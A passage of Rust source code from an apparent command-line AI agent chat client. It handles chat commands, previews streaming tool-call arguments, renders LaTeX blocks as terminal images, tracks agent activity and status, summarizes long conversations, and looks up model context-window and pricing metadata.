                .unwrap_or_else(|e| e.into_inner())
                .clone();
            match pricing.as_ref().and_then(|p| estimate_cost_usd(&usage, p)) {
                Some(cost) => chat_pb.println(&format!(
                    "  Estimated cost:    ${:.4} ({})",
                    cost, openai_opts.model
                )),
                None => chat_pb.println(
                    "  Estimated cost:    unknown (couldn't fetch pricing for this model/endpoint)",
                ),
            }
            Ok(true)
        }
        ChatCommand::Cancel(name) => {
            if stop_sub_agent(running_subagents, &name, "cancelled by the user") {
                chat_pb.println(&format!("Cancelling sub-agent '{}'...", name));
            } else {
                chat_pb.println(&format!("No sub-agent named '{}' is running.", name));
            }
            Ok(true)
        }
        ChatCommand::Plan => {
            let Some(db) = db else {
                chat_pb.println("Database not configured.");
                return Ok(true);
            };
            let items = load_plan(db.as_ref(), &active_agent.name)?;
            if items.is_empty() {
                chat_pb.println(&format!(
                    "Agent '{}' has no active plan.",
                    active_agent.name
                ));
            } else {
                chat_pb.println(&format!("Plan for agent '{}':", active_agent.name));
                for line in format_plan(&items) {
                    chat_pb.println(&format!("  {}", line));
                }
            }
            Ok(true)
        }
        ChatCommand::Summarize | ChatCommand::Message(_) => Ok(false),
        ChatCommand::Empty => Ok(true),
        ChatCommand::Invalid(error_msg) => {
            chat_pb.println(&error_msg);
            Ok(true)
        }
    }
}

/// Extracts a live preview from a tool call's JSON arguments while they're
/// still streaming in: the `key=value` pairs that have already arrived in
/// full, in order, formatted as `key=value, key2=value2`. Stops at the
/// first key or value that isn't complete yet (still returning whatever
/// came before it) and returns `None` if nothing is complete yet, so the
/// status line can show real progress ("path=\"Cargo.toml\"") instead of a
/// meaningless byte count, without ever displaying broken-looking partial
/// JSON.
fn preview_partial_tool_arguments(args_json: &str) -> Option<String> {
    let bytes = args_json.as_bytes();
    if bytes.first() != Some(&b'{') {
        return None;
    }

    // Scans a JSON string starting at its opening quote, returning the
    // index just past the closing quote, or None if it isn't closed yet.
    fn scan_string(bytes: &[u8], start: usize) -> Option<usize> {
        let mut i = start + 1;
        let mut escaped = false;
        while i < bytes.len() {
            match bytes[i] {
                b'\\' if !escaped => escaped = true,
                b'"' if !escaped => return Some(i + 1),
                _ => escaped = false,
            }
            i += 1;
        }
        None
    }

    // Scans a nested object/array value starting at its opening brace or
    // bracket, returning the index just past its matching close, or None
    // if it isn't closed yet.
    fn scan_nested(bytes: &[u8], start: usize) -> Option<usize> {
        let mut depth = 0i32;
        let mut in_string = false;
        let mut escaped = false;
        for (offset, &b) in bytes[start..].iter().enumerate() {
            if in_string {
                match b {
                    b'\\' if !escaped => escaped = true,
                    b'"' if !escaped => in_string = false,
                    _ => escaped = false,
                }
                continue;
            }
            match b {
                b'"' => in_string = true,
                b'{' | b'[' => depth += 1,
                b'}' | b']' => {
                    depth -= 1;
                    if depth == 0 {
                        return Some(start + offset + 1);
                    }
                }
                _ => {}
            }
        }
        None
    }

    fn skip_ws(bytes: &[u8], mut i: usize) -> usize {
        while i < bytes.len() && bytes[i].is_ascii_whitespace() {
            i += 1;
        }
        i
    }

    let mut pairs = Vec::new();
    let mut i = skip_ws(bytes, 1); // past the opening '{'
    while i < bytes.len() && bytes[i] == b'"' {
        let key_end = match scan_string(bytes, i) {
            Some(end) => end,
            None => break,
        };
        let key = &args_json[i + 1..key_end - 1];

        i = skip_ws(bytes, key_end);
        if bytes.get(i) != Some(&b':') {
            break;
        }
        i = skip_ws(bytes, i + 1);
        if i >= bytes.len() {
            break;
        }

        let (value, value_end) = match bytes[i] {
            b'"' => match scan_string(bytes, i) {
                Some(end) => {
                    let raw = &args_json[i..end];
                    let display = serde_json::from_str::<String>(raw)
                        .map(|s| format!("{:?}", s))
                        .unwrap_or_else(|_| raw.to_string());
                    (display, end)
                }
                None => break,
            },
            b'{' | b'[' => match scan_nested(bytes, i) {
                Some(end) => (args_json[i..end].to_string(), end),
                None => break,
            },
            _ => {
                // A number, bool or null: only complete once followed by an
                // actual delimiter, never just because the buffer ends here
                // (more digits could still be on the way).
                let start = i;
                let mut j = i;
                while j < bytes.len() && !matches!(bytes[j], b',' | b'}' | b' ' | b'\t' | b'\n') {
                    j += 1;
                }
                if j >= bytes.len() {
                    break;
                }
                (args_json[start..j].to_string(), j)
            }
        };
        pairs.push(format!("{}={}", key, value));

        i = skip_ws(bytes, value_end);
        if bytes.get(i) == Some(&b',') {
            i = skip_ws(bytes, i + 1);
        } else {
            // Either the object just closed, or something unexpected
            // follows; either way there's nothing more to safely extract.
            break;
        }
    }

    if pairs.is_empty() {
        None
    } else {
        // Guarantee single-line output regardless of caller: a nested
        // object/array value is copied through verbatim and could be
        // pretty-printed with real newlines, and a string value with an
        // unescaped control character (invalid JSON, but tolerated by the
        // scanner above) would otherwise carry a literal newline straight
        // into the status line.
        let joined = pairs.join(", ");
        Some(
            joined
                .replace('\n', " ")
                .replace('\r', " ")
                .replace('\t', " "),
        )
    }
}

/// Formats a byte count for display, e.g. `512 B`, `238.2 KB`, `1.4 MB`.
fn format_bytes(bytes: usize) -> String {
    const UNITS: &[&str] = &["B", "KB", "MB", "GB"];
    let mut value = bytes as f64;
    let mut unit = 0;
    while value >= 1024.0 && unit < UNITS.len() - 1 {
        value /= 1024.0;
        unit += 1;
    }
    if unit == 0 {
        format!("{} {}", bytes, UNITS[unit])
    } else {
        format!("{:.1} {}", value, UNITS[unit])
    }
}

fn format_tool_arguments(args_json: &str) -> String {
    let clean_args = args_json
        .replace('\n', " ")
        .replace('\r', " ")
        .replace('\t', " ");
    if clean_args.len() > 50 {
        let mut end = 47;
        while end > 0 && !clean_args.is_char_boundary(end) {
            end -= 1;
        }
        format!("{}... ({})", &clean_args[..end], clean_args.len())
    } else {
        clean_args
    }
}

/// One thing an incoming stream chunk implies should happen to the current
/// line: append more text to it, terminate it because the model's own
/// output contains a newline there, or (an empty chunk) close out whatever
/// might still be open now that this stream is done for now.
#[derive(Debug, PartialEq, Eq)]
enum StreamStep {
    Partial(String),
    Newline,
    Finish,
}

/// Splits an incoming stream chunk into the sequence of steps it implies.
/// Text is appended to the open line as soon as it arrives - never
/// buffered waiting for a full line - and a newline in the model's own
/// output finishes the line so far, preserving blank lines exactly as the
/// model produced them. An empty chunk is the end-of-stream signal: it
/// closes whatever's left open, but (unlike a real newline) is a no-op if
/// nothing is - it doesn't invent a newline that wasn't there.
///
/// Because nothing is ever held back waiting for a line to complete, a
/// model that degenerates into repeating itself with no line breaks still
/// streams visibly instead of leaving the terminal showing nothing but a
/// growing byte count.
fn stream_steps(chunk: &str) -> Vec<StreamStep> {
    if chunk.is_empty() {
        return vec![StreamStep::Finish];
    }
    let mut steps = Vec::new();
    let mut rest = chunk;
    while let Some(nl) = rest.find('\n') {
        let (line, after) = rest.split_at(nl);
        if !line.is_empty() {
            steps.push(StreamStep::Partial(line.to_string()));
        }
        steps.push(StreamStep::Newline);
        rest = &after[1..];
    }
    if !rest.is_empty() {
        steps.push(StreamStep::Partial(rest.to_string()));
    }
    steps
}

/// Returns a stream handler that prints `style`d text as it arrives, on the
/// current line, finalized into a real line only once the model itself
/// emits a newline (or the stream ends).
fn line_streamer(
    printer: ChatPrinter,
    style: Style,
) -> impl Fn(&str) -> Result<(), Box<dyn Error>> {
    move |chunk: &str| {
        for step in stream_steps(chunk) {
            match step {
                StreamStep::Partial(text) => {
                    printer.print_partial(&style.apply_to(text).to_string())
                }
                StreamStep::Newline => printer.write_newline(),
                StreamStep::Finish => printer.finish_partial_line(),
            }
        }
        Ok(())
    }
}

/// Wraps `line_streamer` with a filter that, when `enabled`, holds back
/// complete `\[...\]`/`\(...\)`/`$$...$$` LaTeX blocks as they finish
/// streaming in, renders each one to an image and displays it in place of
/// the raw text - the moment the block finishes, not batched up until the
/// whole response is done and already printed (which, confirmed against a
/// real report of blocks not looking "converted", just means every image
/// ends up in one pile at the end, disconnected from the text it came
/// from). Falls back to printing the raw block if rendering fails, so
/// nothing the model wrote is ever silently dropped.
///
/// When `enabled` is false, behaves exactly like `line_streamer` itself -
/// no buffering, no extra work - so every user not using
/// --display-graphics sees no change at all.
fn latex_aware_line_streamer(
    printer: ChatPrinter,
    style: Style,
    render_color: fn() -> (u8, u8, u8),
    status_bar: Arc<status_bar::StatusBar>,
    agent_name: String,
    enabled: bool,
) -> impl Fn(&str) -> Result<(), Box<dyn Error>> {
    let plain = line_streamer(printer, style);
    let splitter = Arc::new(Mutex::new(latex_kitty::LatexSplitter::new()));
    move |chunk: &str| {
        if !enabled {
            return plain(chunk);
        }
        let events = {
            let mut s = splitter.lock().unwrap_or_else(|e| e.into_inner());
            if chunk.is_empty() {
                s.finish()
            } else {
                s.push(chunk)
            }
        };
        for event in events {
            match event {
                latex_kitty::StreamSegment::Text(text) => plain(&text)?,
                latex_kitty::StreamSegment::Latex(block) => {
                    status_bar.set_agent_status(&agent_name, "Rendering LaTeX", true);
                    // Queried lazily, right here - not once up front when
                    // this streamer is built - since building one happens
                    // on every turn regardless of whether any LaTeX block
                    // ever actually shows up, and a terminal round-trip
                    // query isn't worth paying for on turns that never need
                    // it at all.
                    let result = latex_kitty::render_latex_to_png(&block, render_color());
                    status_bar.clear_agent_status(&agent_name);
                    match result {
                        Ok(png) => latex_kitty::display_png(&png),
                        Err(e) => {
                            log::warn!("couldn't render LaTeX block {:?}: {}", block, e);
                            plain(&block)?;
                        }
                    }
                }
            }
        }
        // Let line_streamer's own Finish step run too, closing any partial
        // line the flushed text above may have left open - same as it
        // would for any other end-of-stream chunk.
        if chunk.is_empty() {
            plain("")?;
        }
        Ok(())
    }
}

/// Keeps an agent's `activity` in the database up to date - for `faber
/// agents` - writing only when it changes, so progress updates that keep
/// saying the same thing cost nothing.
struct ActivityRecorder {
    db: Arc<dyn DbBackend>,
    agent: String,
    last: Mutex<String>,
}

impl ActivityRecorder {
    fn new(db: Arc<dyn DbBackend>, agent: &str) -> Arc<Self> {
        Arc::new(Self {
            db,
            agent: agent.to_string(),
            last: Mutex::new(String::new()),
        })
    }

    fn set(&self, activity: &str) {
        let mut last = self.last.lock().unwrap_or_else(|e| e.into_inner());
        if *last != activity {
            *last = activity.to_string();
            let _ = self.db.set_agent_activity(&self.agent, activity);
        }
    }

    /// Records `activity` even if it's what this recorder last wrote:
    /// another recorder of the same agent may have changed it since.
    fn force(&self, activity: &str) {
        *self.last.lock().unwrap_or_else(|e| e.into_inner()) = activity.to_string();
        let _ = self.db.set_agent_activity(&self.agent, activity);
    }

    /// Records the activity a progress update means, if any.
    fn follow(&self, status: &StatusUpdate) {
        let activity = match status {
            StatusUpdate::Thinking => "thinking".to_string(),
            StatusUpdate::ToolStart { name, .. } => format!("running {}", name),
            StatusUpdate::WaitingForSlot => "waiting for a free request slot".to_string(),
            StatusUpdate::SendingRequest { .. } => "waiting for the model".to_string(),
            _ => return,
        };
        self.set(&activity);
    }
}

/// Marks the agent idle when dropped - however its turn ended.
struct IdleWhenDone(Option<Arc<ActivityRecorder>>);

impl Drop for IdleWhenDone {
    fn drop(&mut self) {
        if let Some(activity) = &self.0 {
            activity.set("idle");
        }
    }
}

/// `mode`, also recorded in the database as an agent's events (see
/// `agent_io`) when there is a database to record them in.
fn recorded_mode(mode: ResponseMode, events: &Option<Arc<EventLog>>) -> ResponseMode {
    match events {
        Some(events) => agent_io::observed(mode, events.clone()),
        None => mode,
    }
}

/// Records that a turn ended, as `outcome` says.
fn record_turn_end(events: &Option<Arc<EventLog>>, outcome: &db::TaskOutcome) {
    if let Some(events) = events {
        events.emit(AgentEvent::TurnEnd {
            succeeded: outcome.succeeded,
            text: outcome.result.clone(),
        });
    }
}

fn create_response_mode(
    printer: ChatPrinter,
    status_bar: Arc<status_bar::StatusBar>,
    agent_name: String,
    pending_complete_message: Arc<Mutex<Option<String>>>,
    graphics_mode: Option<DisplayGraphicsMode>,
    reasoning_accumulator: Arc<Mutex<String>>,
    activity: Option<Arc<ActivityRecorder>>,
) -> ResponseMode {
    let tool_active = Arc::new(AtomicBool::new(false));
    let completed = Arc::new(AtomicBool::new(false));
    let partial_inline = graphics_mode == Some(DisplayGraphicsMode::Partial);

    // "full" never prints live text at all, for either stream: there's no
    // way to know in advance whether the whole response will even end up
    // rendering successfully as one document once it's done (see
    // render_full_or_fallback), and printing it live *and* possibly also
    // showing a rendered image afterward would defeat the point - anything
    // already on screen (and copy-pasteable) as raw text can never be
    // un-printed. The existing "Streaming (N bytes)" status update still
    // gives some sense of progress in the meantime.
    let answer: Box<dyn Fn(&str) -> Result<(), Box<dyn Error>>> =
        if graphics_mode == Some(DisplayGraphicsMode::Full) {
            Box::new(|_: &str| Ok(()))
        } else {
            Box::new(latex_aware_line_streamer(
                printer.clone(),
                Style::new().cyan(),
                latex_kitty::answer_text_color,
                status_bar.clone(),
                agent_name.clone(),
                partial_inline,
            ))
        };
    let tool_active_for_stream = tool_active.clone();

    let printer_for_progress = printer.clone();
    let tool_active_for_progress = tool_active;
    let completed_for_progress = completed;

    // Reasoning is streamed live but - unlike the final answer, which ends
    // up in response.choices - it's never kept anywhere once the response
    // completes (see the README: "not kept in the conversation history").
    // "full" mode needs the whole thing anyway (to render it too, once the
    // response is done), so it's accumulated here specifically for that;
    // "partial" and off don't touch the accumulator at all.
    let reasoning: Box<dyn Fn(&str) -> Result<(), Box<dyn Error>>> =
        if graphics_mode == Some(DisplayGraphicsMode::Full) {
            Box::new(move |chunk: &str| {
                if let Ok(mut accumulated) = reasoning_accumulator.lock() {
                    accumulated.push_str(chunk);
                }
                Ok(())
            })
        } else {
            Box::new(latex_aware_line_streamer(
                printer,
                Style::new().color256(244).italic(),
                latex_kitty::reasoning_text_color,
                status_bar.clone(),
                agent_name.clone(),
                partial_inline,
            ))
        };

    ResponseMode::Streaming {
        stream_handler: Box::new(move |chunk: &str| {
            if !chunk.is_empty() && tool_active_for_stream.load(Ordering::Relaxed) {
                return Ok(());
            }
            answer(chunk)
        }),
        reasoning_handler: Box::new(move |chunk: &str| reasoning(chunk)),
        progress_handler: Box::new(move |progress_info: &ProgressInfo| {
            if let Some(activity) = &activity {
                activity.follow(&progress_info.status);
            }
            if completed_for_progress.load(Ordering::Relaxed) {
                return Ok(());
            }
            match &progress_info.status {
                StatusUpdate::Thinking => {
                    status_bar.set_agent_status(&agent_name, "Thinking", true);
                }
                StatusUpdate::ToolAccumulating { name, arguments } => {
                    // The arguments are still being streamed in, so they're
                    // incomplete/invalid JSON at this point; showing them raw
                    // (as format_tool_arguments does once they're complete)
                    // would just look like a broken tool call. Show whatever
                    // key/value pairs have already arrived in full instead,
                    // falling back to a byte count until the first one lands.
                    let status = match preview_partial_tool_arguments(arguments) {
                        Some(preview) => {
                            format!("Preparing {}({})", name, format_tool_arguments(&preview))
                        }
                        None => format!("Preparing {} ({} chars)", name, arguments.len()),
                    };
                    status_bar.set_agent_status(&agent_name, &status, false);
                }
                StatusUpdate::ToolStart { name, arguments } => {
                    tool_active_for_progress.store(true, Ordering::Relaxed);
                    let formatted_args = format_tool_arguments(arguments);
                    status_bar.set_agent_status(
                        &agent_name,
                        &format!("Running {}({})", name, formatted_args),
                        true,
                    );
                    printer_for_progress.println(&tool_box_open(name, &formatted_args));
                }
                StatusUpdate::ToolBatchStart { names } => {
                    status_bar.set_agent_status(
                        &agent_name,
                        &format!(
                            "Running {} tools in parallel: {}",
                            names.len(),
                            names.join(", ")
                        ),
                        true,
                    );
                }
                StatusUpdate::ToolComplete {
                    name, duration_ms, ..
                } => {
                    let duration_secs = *duration_ms as f64 / 1000.0;
                    tool_active_for_progress.store(false, Ordering::Relaxed);
                    printer_for_progress.println(&tool_box_close(name, duration_secs));
                }
                StatusUpdate::StreamProcessing {
                    bytes_read,
                    chunks_processed,
                } => {
                    status_bar.set_agent_status(
                        &agent_name,
                        &format!(
                            "Streaming ({} bytes, {} chunks)",
                            bytes_read, chunks_processed
                        ),
                        false,
                    );
                }
                StatusUpdate::WaitingForSlot => {
                    status_bar.set_agent_status(
                        &agent_name,
                        "Waiting for other requests to the model to finish",
                        true,
                    );
                }
                StatusUpdate::SendingRequest { bytes } => {
                    // Reported once per turn, right before the request is
                    // sent. A long wait here means a large prompt is still
                    // being processed server-side, not a hang - show its
                    // size so that's clear instead of just a ticking clock.
                    status_bar.set_agent_status(
                        &agent_name,
                        &format!("Waiting for response ({} sent)", format_bytes(*bytes)),
                        true,
                    );
                }
                StatusUpdate::Complete { usage } => {
                    completed_for_progress.store(true, Ordering::Relaxed);
                    let elapsed_secs = progress_info.elapsed_ms as f64 / 1000.0;
                    status_bar.clear_agent_status(&agent_name);

                    let message = if let Some(usage) = usage {
                        let mut parts = Vec::new();
                        if let Some(input_tokens) = usage.prompt_tokens {
                            parts.push(format!("Input: {}", input_tokens));
                        }
                        if let Some(output_tokens) = usage.completion_tokens {
                            parts.push(format!("Output: {}", output_tokens));
                        }
                        if let Some(total_tokens) = usage.total_tokens {
                            parts.push(format!("Total: {}", total_tokens));
                        }
                        if !parts.is_empty() {
                            format!("Complete | {} | {:.1}s", parts.join(" > "), elapsed_secs)
                        } else {
                            format!("Complete | {:.1}s", elapsed_secs)
                        }
                    } else {
                        format!("Complete | {:.1}s", elapsed_secs)
                    };
                    // Deferred rather than printed here directly: the
                    // caller still has --display-graphics rendering left to
                    // do once the response itself is done, and printing
                    // "Complete" before that finishes would make it look
                    // like the turn ended while more of it is still coming.
                    if let Ok(mut pending) = pending_complete_message.lock() {
                        *pending = Some(message);
                    } else {
                        printer_for_progress.println(&message);
                    }
                }
            }
            Ok(())
        }),
    }
}

fn execute_ai_request(
    messages: Vec<Message>,
    tools: &ToolsCollection,
    openai_opts: &openai::Opts,
    mode: ResponseMode,
    tool_context: &ToolContext,
    ctrl_c_rx: Option<Arc<Mutex<mpsc::Receiver<()>>>>,
    signal_handler_active: &Arc<AtomicBool>,
    status_bar: &Arc<status_bar::StatusBar>,
    chat_pb: &ChatPrinter,
    agent_name: &str,
) -> Result<OpenAIResponse, Box<dyn Error>> {
    signal_handler_active.store(true, Ordering::Relaxed);

    let response = match post_request_with_mode(
        messages,
        tools,
        openai_opts,
        mode,
        tool_context,
        ctrl_c_rx.clone(),
    ) {
        Ok(response) => {
            signal_handler_active.store(false, Ordering::Relaxed);
            if let Some(ref ctrl_c_rx) = ctrl_c_rx {
                if let Ok(receiver) = ctrl_c_rx.lock() {
                    while receiver.try_recv().is_ok() {}
                }
            }
            response
        }
        Err(e) => {
            signal_handler_active.store(false, Ordering::Relaxed);
            if let Some(ref ctrl_c_rx) = ctrl_c_rx {
                if let Ok(receiver) = ctrl_c_rx.lock() {
                    while receiver.try_recv().is_ok() {}
                }
            }
            status_bar.clear_agent_status(agent_name);
            if e.downcast_ref::<InterruptedError>().is_some() {
                chat_pb.println("Operation interrupted. Type your next message or /quit to exit.");
            }
            return Err(e);
        }
    };

    status_bar.clear_agent_status(agent_name);
    Ok(response)
}

/// Tells the user when the model stopped because it ran out of tokens rather
/// than because it was done, which otherwise looks like a complete answer.
fn warn_if_truncated(response: &OpenAIResponse, chat_pb: &ChatPrinter) {
    let finish_reason = response
        .choices
        .as_ref()
        .and_then(|choices| choices.first())
        .and_then(|choice| choice.finish_reason.as_deref());
    if finish_reason == Some("length") {
        chat_pb.println(
            "Warning: the response was cut off (finish reason: length).  The token limit or \
             the context window was reached; try /summarize, /clear or fewer tools.",
        );
    }
}

/// Prints a one-time, actionable warning at chat startup for each thing
/// that would make `--display-graphics` silently do nothing all session -
/// an unsupported terminal, or a missing LaTeX toolchain - rather than
/// leaving the person to wonder why nothing ever renders. Checked once
/// here instead of only surfacing this the first time a response actually
/// contains a LaTeX block.
fn warn_about_display_graphics_setup(chat_pb: &ChatPrinter) {
    if !latex_kitty::is_kitty_terminal() {
        chat_pb.println(&format!(
            "Note: --display-graphics is set, but this doesn't look like a supported \
             terminal (currently: Kitty's graphics protocol; detected TERM={:?}, \
             KITTY_WINDOW_ID={:?}) - LaTeX blocks won't be rendered. If you're inside \
             tmux/screen, Kitty's terminal identification often doesn't pass through \
             into it.",
            std::env::var("TERM").ok(),
            std::env::var("KITTY_WINDOW_ID").ok()
        ));
        return;
    }
    let missing = latex_kitty::missing_toolchain_tools();
    if !missing.is_empty() {
        chat_pb.println(&format!(
            "Note: --display-graphics is set, but {} not found on PATH - install a \
             LaTeX distribution (for pdflatex) and poppler-utils (for pdftocairo) to \
             render LaTeX blocks.",
            missing.join(" and ")
        ));
    }
}

/// The effective `--display-graphics` mode: `None` if the flag wasn't
/// given, or if it was but the terminal isn't recognized as supporting
/// inline graphics - there'd be nowhere to show an image either way, so
/// every caller can treat this the same as the flag being off at all.
fn display_graphics_mode(opts: &Opts) -> Option<DisplayGraphicsMode> {
    opts.display_graphics
        .filter(|_| latex_kitty::is_kitty_terminal())
}

/// `--display-graphics=partial`'s non-streaming counterpart to
/// `latex_aware_line_streamer`: renders any LaTeX blocks in `msg` as images
/// in place of their raw text, for a message that arrives as a single
/// already-complete string (an injected/background notification) rather
/// than incrementally.
///
/// Doesn't reproduce `ChatPrinter::println_agent`'s own two-space indent:
/// doing so correctly while also replacing arbitrary *inline* (same-line)
/// LaTeX blocks with images - without forcing surrounding text before/
/// after the image onto its own separate line - needs the same "current
/// open line" tracking `latex_aware_line_streamer` already does via
/// `line_streamer`, which knows nothing about indentation. Reusing it
/// as-is (unindented, like the live streaming path already looks) was
/// judged the better trade-off over duplicating that logic just to keep
/// the indent.
fn println_agent_with_latex(
    chat_pb: &ChatPrinter,
    agent_name: &str,
    msg: &str,
    status_bar: &Arc<status_bar::StatusBar>,
) {
    let header = agent_style(agent_name).apply_to(format!("── {} ──", agent_name));
    chat_pb.println(&header.to_string());
    let stream = latex_aware_line_streamer(
        chat_pb.clone(),
        Style::new(),
        latex_kitty::answer_text_color,
        status_bar.clone(),
        agent_name.to_string(),
        true,
    );
    let _ = stream(msg);
    let _ = stream("");
    chat_pb.println("");
}

/// `--display-graphics=full`'s core: tries to render `text` (the whole
/// response, or its reasoning) as one properly typeset LaTeX document and
/// display it, falling back to printing `text` itself - styled as `style`,
/// matching how it would have looked streamed live - only if rendering
/// fails. `label` names what's being rendered, for the status bar text and
/// a failure's log message (e.g. "response" or "reasoning").
///
/// This is the *only* place `text` is guaranteed to end up on screen at
/// all: full mode never prints live text while a response is still
/// streaming in (see `create_response_mode`), since there'd be no way to
/// know in advance whether the eventual document will even compile -
/// printing it live regardless would leave it in the terminal (and
/// copy-pasteable from it) even after a successful render made that raw
/// text redundant.
fn render_full_or_fallback(
    chat_pb: &ChatPrinter,
    status_bar: &Arc<status_bar::StatusBar>,
    agent_name: &str,
    label: &str,
    text: &str,
    style: Style,
    render_color: fn() -> (u8, u8, u8),
) {
    status_bar.set_agent_status(agent_name, &format!("Rendering {label} as LaTeX"), true);
    let result = latex_kitty::render_full_response_to_png(text, render_color());
    status_bar.clear_agent_status(agent_name);
    match result {
        Ok(png) => latex_kitty::display_png(&png),
        Err(e) => {
            log::warn!("couldn't render the {label} as LaTeX: {}", e);
            let stream = line_streamer(chat_pb.clone(), style);
            let _ = stream(text);
            let _ = stream("");
        }
    }
}

/// `--display-graphics=full`'s counterpart for the non-streaming
/// (injected/background) path: prints the agent header, then tries to
/// render `msg` as one properly typeset document (`render_full_or_fallback`
/// - printing `msg` itself only if that fails, not unconditionally, so a
/// successful render doesn't leave the raw text sitting in the terminal
/// too). There's no reasoning stream on this path, so only the answer's
/// own color applies.
fn println_agent_full_latex(
    chat_pb: &ChatPrinter,
    agent_name: &str,
    msg: &str,
    status_bar: &Arc<status_bar::StatusBar>,
) {
    let header = agent_style(agent_name).apply_to(format!("── {} ──", agent_name));
    chat_pb.println(&header.to_string());
    render_full_or_fallback(
        chat_pb,
        status_bar,
        agent_name,
        "response",
        msg,
        Style::new(),
        latex_kitty::answer_text_color,
    );
    chat_pb.println("");
}

fn save_agent_history(db: &Option<Arc<dyn DbBackend>>, agent: &AgentState) {
    if let Some(db) = db {
        let msgs: Vec<serde_json::Value> = agent
            .messages
            .iter()
            .map(|m| serde_json::to_value(m).unwrap())
            .collect();
        let _ = db.save_agent_messages(&agent.name, &msgs);
    }
}

/// Replaces the agent's history with a summary of `source` (the current
/// history, or the one recovered from a failed request) and saves it.
fn summarize_agent_history(
    agent: &mut AgentState,
    source: &[Message],
    keep_last_user: bool,
    openai_opts: &openai::Opts,
    db: &Option<Arc<dyn DbBackend>>,
    ctrl_c_rx: &Arc<Mutex<mpsc::Receiver<()>>>,
    signal_handler_active: &Arc<AtomicBool>,
    status_bar: &Arc<status_bar::StatusBar>,
    chat_pb: &ChatPrinter,
) -> Result<(), Box<dyn Error>> {
    status_bar.set_agent_status(&agent.name, "Summarizing", true);
    signal_handler_active.store(true, Ordering::Relaxed);
    let result = summarize::summarize_conversation(
        source,
        keep_last_user,
        openai_opts,
        &Some(ctrl_c_rx.clone()),
    );
    signal_handler_active.store(false, Ordering::Relaxed);
    if let Ok(receiver) = ctrl_c_rx.lock() {
        while receiver.try_recv().is_ok() {}
    }
    status_bar.clear_agent_status(&agent.name);

    let summarized = result.map_err(|e| {
        if e.downcast_ref::<InterruptedError>().is_some() {
            chat_pb.println("Operation interrupted. Type your next message or /quit to exit.");
        }
        e
    })?;
    chat_pb.println(&format!(
        "Conversation summarized: {} messages -> {}.",
        source.len(),
        summarized.len()
    ));
    if let Some(summary) = summarized.iter().find(|m| summarize::is_summary(m)) {
        chat_pb.println(summary.content.as_deref().unwrap_or(""));
    }
    agent.messages = summarized;
    // Whatever context size was last known no longer applies - the
    // history it described has just been replaced with a much smaller
    // summary.
    agent.last_prompt_tokens = None;
    save_agent_history(db, agent);
    Ok(())
}

/// How close to the model's context window `last_prompt_tokens` has to get
/// before `maybe_summarize_proactively` summarizes ahead of the next
/// request, rather than waiting for it to actually fail. Well short of
/// 1.0: `last_prompt_tokens` is one turn behind (it's the size the
/// conversation *was* at the last request, not including whatever's been
/// added since - the current turn's own message, any tool calls it
/// makes), and there's no cost to summarizing a little earlier than
/// strictly necessary, unlike the cost of guessing wrong and hitting the
/// same failure this is meant to avoid.
const PROACTIVE_SUMMARIZE_MARGIN: f64 = 0.8;

/// Decides whether to proactively summarize now, before sending another
/// request, rather than waiting for an actual context-length-exceeded
/// failure - true only once both pieces of information needed to decide
/// are actually known (see `AgentState::last_prompt_tokens` and
/// `spawn_context_window_lookup` for how each becomes available, or stays
/// `None` indefinitely if it can't be determined).
fn should_summarize_proactively(
    last_prompt_tokens: Option<u32>,
    context_window: Option<u32>,
) -> bool {
    match (last_prompt_tokens, context_window) {
        (Some(tokens), Some(window)) if window > 0 => {
            f64::from(tokens) >= f64::from(window) * PROACTIVE_SUMMARIZE_MARGIN
        }
        _ => false,
    }
}

/// If `should_summarize_proactively` says it's time, summarizes `agent`'s
/// conversation right now, before the caller goes on to send its next
/// request - the proactive counterpart to `request_with_summary_fallback`,
/// which only ever summarizes reactively, after a request has already
/// failed. Best-effort: summarization failing here is only printed, not
/// propagated, since the request that follows might still succeed without
/// it - the same way a failure to render a LaTeX block falls back to
/// showing the raw text rather than losing the turn entirely.
fn maybe_summarize_proactively(
    agent: &mut AgentState,
    context_window: &Arc<Mutex<Option<u32>>>,
    openai_opts: &openai::Opts,
    db: &Option<Arc<dyn DbBackend>>,
    ctrl_c_rx: &Arc<Mutex<mpsc::Receiver<()>>>,
    signal_handler_active: &Arc<AtomicBool>,
    status_bar: &Arc<status_bar::StatusBar>,
    chat_pb: &ChatPrinter,
) {
    let window = *context_window.lock().unwrap_or_else(|e| e.into_inner());
    if !should_summarize_proactively(agent.last_prompt_tokens, window) {
        return;
    }
    chat_pb.println("Context is getting large, summarizing proactively before continuing...");
    let current_messages = agent.messages.clone();
    if let Err(e) = summarize_agent_history(
        agent,
        &current_messages,
        true,
        openai_opts,
        db,
        ctrl_c_rx,
        signal_handler_active,
        status_bar,
        chat_pb,
    ) {
        if e.downcast_ref::<InterruptedError>().is_none() {
            chat_pb.println(&format!(
                "Proactive summarization failed, continuing without it: {}",
                e
            ));
        }
    }
}

/// Looks up `model`'s context window size and pricing from `endpoint`'s
/// `/models` listing (`models_endpoint_from`) in a background thread,
/// storing whichever it finds into `context_window`/`pricing`. Used to
/// populate `--context-window` automatically when it wasn't given
/// explicitly, and to make `/cost` able to show an estimated dollar
/// amount rather than only raw token counts - spawned once at chat
/// startup rather than called inline, since it's a network request that
/// would otherwise delay the first prompt for what's a purely best-effort
/// convenience either way; if it fails, times out, or the model isn't in
/// the list, both are simply left as `None` (proactive summarization never
/// triggers, `/cost` shows tokens only), same as if this were never called
/// at all.
fn spawn_model_metadata_lookup(
    context_window: Arc<Mutex<Option<u32>>>,
    context_window_is_explicit: bool,
    pricing: Arc<Mutex<Option<openai::Pricing>>>,
    endpoint: String,
    api_key: Option<String>,
    model: String,
) {
    std::thread::spawn(move || {
        let models_endpoint = models_endpoint_from(&endpoint);
        let models = match list_models_from_endpoint(&models_endpoint, api_key.as_ref()) {
            Ok(models) => models,
            Err(e) => {
                debug!("Model metadata lookup at {} failed: {}", models_endpoint, e);
                return;
            }
        };
        let Some(found) = openai::find_model(models, &model) else {
            debug!("Model '{}' not listed at {}", model, models_endpoint);
            return;
        };
        debug!(
            "Model metadata for '{}': context window {:?}",
            found.id,
            found.context_window()
        );
        // Never overwrite an explicit --context-window with whatever the
        // lookup finds, even if it finds something different - the CLI
        // flag is a deliberate override, not just a fallback default that
        // happens to run first.
        if !context_window_is_explicit {
            if let Some(context_length) = found.context_window() {
                *context_window.lock().unwrap_or_else(|e| e.into_inner()) = Some(context_length);
            }
        }
        if let Some(model_pricing) = found.pricing {
            *pricing.lock().unwrap_or_else(|e| e.into_inner()) = Some(model_pricing);
        }
    });
}

/// How many times `request_with_summary_fallback` shortens tool results
/// in one turn before falling back to summarizing the conversation.
